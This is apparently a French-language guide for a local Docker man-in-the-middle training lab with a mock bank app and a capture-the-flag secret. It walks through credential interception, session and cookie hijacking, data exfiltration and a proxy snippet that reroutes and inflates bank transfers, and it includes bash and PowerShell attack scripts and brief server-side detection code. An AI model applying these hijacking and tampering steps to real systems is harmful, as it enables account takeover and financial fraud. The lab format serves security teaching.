# EXEMPLES D'EXPLOITATION - Man-in-the-Middle Attack Lab

## Scénario 1 : Interception de credentials basique

### Étape 1 : Établir la position MITM

Le proxy MITM est déjà en place (port 8888) entre le client et le serveur victime.

### Étape 2 : Victime se connecte

```bash
curl -X POST http://localhost:8888/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"alice2024"}' \
  -v
```

### Étape 3 : Attaquant récupère les credentials

```bash
curl http://localhost:8889/intercepted/credentials
```

**Résultat attendu** :
```json
{
  "success": true,
  "count": 1,
  "data": [
    {
      "timestamp": "2026-02-24T10:30:00.000Z",
      "username": "alice",
      "password": "alice2024",
      "ip": "::ffff:172.18.0.1",
      "userAgent": "curl/7.68.0"
    }
  ]
}
```

**Impact** : L'attaquant possède maintenant les credentials en clair !

---

## Scénario 2 : Session Hijacking complet

### Étape 1 : Intercepter la connexion

```bash
# Victime se connecte via le proxy
curl -X POST http://localhost:8888/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"alice2024"}' \
  -c cookies.txt \
  -v
```

### Étape 2 : Observer la session dans les logs

```bash
# Voir les logs du proxy en temps réel
docker logs -f mitm-proxy
```

**Logs attendus** :
```
╔═══════════════════════════════════════════╗
║  🔑 SESSION HIJACKED!                     ║
╠═══════════════════════════════════════════╣
║  User: alice                              ║
║  Role: user                               ║
║  Session: s:ABCdef123456...               ║
║  Time: 2026-02-24T10:30:00               ║
╚═══════════════════════════════════════════╝
```

### Étape 3 : Récupérer les détails de session

```bash
curl http://localhost:8889/intercepted/sessions | jq .
```

**Résultat** :
```json
{
  "success": true,
  "count": 1,
  "data": [
    {
      "timestamp": "2026-02-24T10:30:00.000Z",
      "sessionId": "s:ABCdef123456789",
      "user": {
        "id": 2,
        "username": "alice",
        "email": "alice@bank.local",
        "role": "user",
        "balance": 2500
      },
      "cookies": [
        "connect.sid=s%3AABCdef123456789; Path=/; HttpOnly"
      ]
    }
  ]
}
```

### Étape 4 : Réutiliser la session volée

```bash
# Attaquant accède au compte avec la session volée
curl http://localhost:8888/api/account \
  -b cookies.txt
```

**Résultat** :
```json
{
  "success": true,
  "user": {
    "id": 2,
    "username": "alice",
    "email": "alice@bank.local",
    "role": "user",
    "balance": 2500,
    "secret": "Numéro de carte: 4532-1234-5678-9010"
  }
}
```

**Impact** : L'attaquant a accès complet au compte sans connaître le mot de passe !

---

## Scénario 3 : Cookie Stealing et réutilisation

### Méthode 1 : Extraction depuis les cookies interceptés

```bash
# Lister tous les cookies capturés
curl http://localhost:8889/intercepted/cookies | jq .
```

**Résultat** :
```json
{
  "success": true,
  "count": 3,
  "data": [
    {
      "timestamp": "2026-02-24T10:30:00.000Z",
      "url": "/api/login",
      "cookies": "connect.sid=s%3AABCdef123456789"
    },
    {
      "timestamp": "2026-02-24T10:30:15.000Z",
      "url": "/api/account",
      "cookies": "connect.sid=s%3AABCdef123456789; auth_token=2:alice:1708772400000"
    }
  ]
}
```

### Méthode 2 : Utilisation directe

```bash
# Créer un fichier cookies avec les valeurs volées
echo "localhost	FALSE	/	FALSE	0	connect.sid	s%3AABCdef123456789" > stolen-cookies.txt

# Utiliser les cookies volés
curl http://localhost:8888/api/account \
  -b stolen-cookies.txt
```

---

## Scénario 4 : Exfiltration de données sensibles

### Étape 1 : Victime consulte des informations sensibles

```bash
# Victime authentifiée consulte son compte
curl http://localhost:8888/api/account \
  -b cookies.txt
```

### Étape 2 : Observer l'interception dans les logs

```bash
docker logs mitm-proxy | tail -20
```

**Logs** :
```
╔═══════════════════════════════════════════╗
║  💳 SENSITIVE DATA INTERCEPTED!           ║
╠═══════════════════════════════════════════╣
║  User: alice                              ║
║  Secret: Numéro de carte: 4532-1234-5678 ║
║  Balance: $2500                           ║
╚═══════════════════════════════════════════╝
```

### Étape 3 : Récupérer toutes les données

```bash
curl http://localhost:8889/intercepted/all | jq '.data.responses[] | select(.url == "/api/account")'
```

---

## Scénario 5 : Man-in-the-Middle avec transfert bancaire

### Étape 1 : Victime initie un transfert

```bash
# Alice transfère 100$ à Bob
curl -X POST http://localhost:8888/api/transfer \
  -H "Content-Type: application/json" \
  -H "Cookie: connect.sid=s%3AABCdef123456789" \
  -d '{"to":"bob","amount":100}'
```

### Étape 2 : Observation par l'attaquant

Le proxy MITM voit la requête complète :

**Requête interceptée** :
```json
{
  "method": "POST",
  "url": "/api/transfer",
  "body": {
    "to": "bob",
    "amount": 100
  },
  "cookies": "connect.sid=s%3AABCdef123456789"
}
```

### Étape 3 : Potentiel de modification (attaque avancée)

L'attaquant pourrait modifier le proxy pour changer le destinataire ou le montant :

```javascript
// Dans mitm-proxy.js (exemple de modification)
if (req.url === '/api/transfer' && req.body.to === 'bob') {
  // Rediriger vers le compte de l'attaquant
  req.body.to = 'attacker';
  req.body.amount = req.body.amount * 10;
  console.log('[MITM] Transaction modifiée !');
}
```

---

## Scénario 6 : Attaque en cascade

### Objectif : Compromettre plusieurs comptes

```bash
# 1. Intercepter alice
curl -X POST http://localhost:8888/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"alice2024"}' \
  -c alice-cookies.txt

# 2. Intercepter bob
curl -X POST http://localhost:8888/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"bob","password":"bobsecure"}' \
  -c bob-cookies.txt

# 3. Intercepter admin
curl -X POST http://localhost:8888/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"Admin123!"}' \
  -c admin-cookies.txt

# 4. Voir tous les comptes compromis
curl http://localhost:8889/intercepted/credentials
```

**Résultat** : L'attaquant possède les credentials de tous les utilisateurs !

---

## Scénario 7 : Persistence via cookie réutilisation

### Étape 1 : Capturer une session longue durée

```bash
# Session avec cookie de longue durée (1h)
curl -X POST http://localhost:8888/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"Admin123!"}' \
  -c admin-session.txt
```

### Étape 2 : Vérifier la durée de validité

```bash
cat admin-session.txt
```

### Étape 3 : Réutiliser après un délai

```bash
# 30 minutes plus tard...
curl http://localhost:8888/api/account \
  -b admin-session.txt

# La session est toujours valide !
```

---

## Scénario 8 : Exfiltration du FLAG

### Objectif : Récupérer le secret de l'admin

```bash
# 1. Se connecter en tant qu'admin via le proxy
curl -X POST http://localhost:8888/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"Admin123!"}' \
  -c admin.txt

# 2. Accéder au compte
curl http://localhost:8888/api/account \
  -b admin.txt

# 3. Observer le secret intercepté
curl http://localhost:8889/intercepted/all | jq '.data.responses[] | select(.url == "/api/account" and .body.user.username == "admin") | .body.user.secret'
```

**Résultat** :
```json
"FLAG{mitm_attack_master}"
```

---

## Tableau récapitulatif des attaques

| Attaque | Endpoint cible | Données volées | Difficulté |
|---------|---------------|----------------|------------|
| Credential Interception | `/api/login` | username, password | Facile |
| Session Hijacking | `/api/login` + `/api/account` | Session ID, cookies | Facile |
| Cookie Stealing | Tous | Cookies de session | Facile |
| Data Exfiltration | `/api/account` | Données sensibles, secrets | Moyen |
| Transaction Monitoring | `/api/transfer` | Détails des transactions | Moyen |
| Traffic Modification | Tous | Contrôle complet du trafic | Difficile |

---

## Scripts d'automatisation

### Script Bash : Compromission complète

```bash
#!/bin/bash

# Script d'exploitation automatique MITM

echo "=== MITM Attack Automation ==="

# 1. Intercepter les credentials
echo "[1] Intercepting credentials..."
curl -s -X POST http://localhost:8888/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"alice2024"}' \
  -c session.txt > /dev/null

# 2. Récupérer les credentials
echo "[2] Retrieving stolen credentials..."
curl -s http://localhost:8889/intercepted/credentials | jq '.data[-1]'

# 3. Récupérer la session
echo "[3] Retrieving hijacked session..."
curl -s http://localhost:8889/intercepted/sessions | jq '.data[-1]'

# 4. Accéder au compte avec la session volée
echo "[4] Accessing account with stolen session..."
curl -s http://localhost:8888/api/account \
  -b session.txt | jq '.user'

# 5. Exfiltrer le secret
echo "[5] Exfiltrating secret..."
SECRET=$(curl -s http://localhost:8888/api/account -b session.txt | jq -r '.user.secret')
echo "SECRET FOUND: $SECRET"

echo "=== Attack Complete ==="
```

### Script PowerShell : Exploitation

```powershell
# Script d'exploitation MITM en PowerShell

Write-Host "=== MITM Attack PowerShell ==="

# 1. Connexion via proxy
$body = @{username="alice"; password="alice2024"} | ConvertTo-Json
$response = Invoke-RestMethod -Uri "http://localhost:8888/api/login" `
    -Method Post -ContentType "application/json" -Body $body `
    -SessionVariable session

Write-Host "[+] Login successful!"

# 2. Récupérer credentials interceptés
$creds = Invoke-RestMethod -Uri "http://localhost:8889/intercepted/credentials"
Write-Host "[+] Intercepted credentials:" $creds.count

# 3. Accéder au compte
$account = Invoke-RestMethod -Uri "http://localhost:8888/api/account" `
    -WebSession $session

Write-Host "[+] Secret found:" $account.user.secret

Write-Host "=== Attack Complete ==="
```

---

## Contre-mesures et détection

### Détection côté serveur

```javascript
// Détecter les requêtes suspicieuses
app.use((req, res, next) => {
  // Vérifier l'origine
  const origin = req.headers.origin;
  const referer = req.headers.referer;
  
  // Détecter les proxies
  const forwardedFor = req.headers['x-forwarded-for'];
  if (forwardedFor) {
    console.warn(`[SECURITY] Proxied request detected: ${forwardedFor}`);
  }
  
  next();
});
```

### Logging et alerting

```javascript
// Logger les activités suspicieuses
function logSecurityEvent(type, data) {
  console.log({
    type: 'SECURITY_EVENT',
    eventType: type,
    timestamp: new Date().toISOString(),
    data: data
  });
  
  // Envoyer une alerte
  // sendAlert(type, data);
}

// Détecter les réutilisations de session
app.use((req, res, next) => {
  if (req.session.lastIP && req.session.lastIP !== req.ip) {
    logSecurityEvent('SESSION_IP_CHANGE', {
      sessionId: req.sessionID,
      oldIP: req.session.lastIP,
      newIP: req.ip
    });
  }
  req.session.lastIP = req.ip;
  next();
});
```

---

**📚 Note** : Ces exemples sont à des fins éducatives uniquement. L'utilisation de ces techniques sur des systèmes réels sans autorisation est illégale.
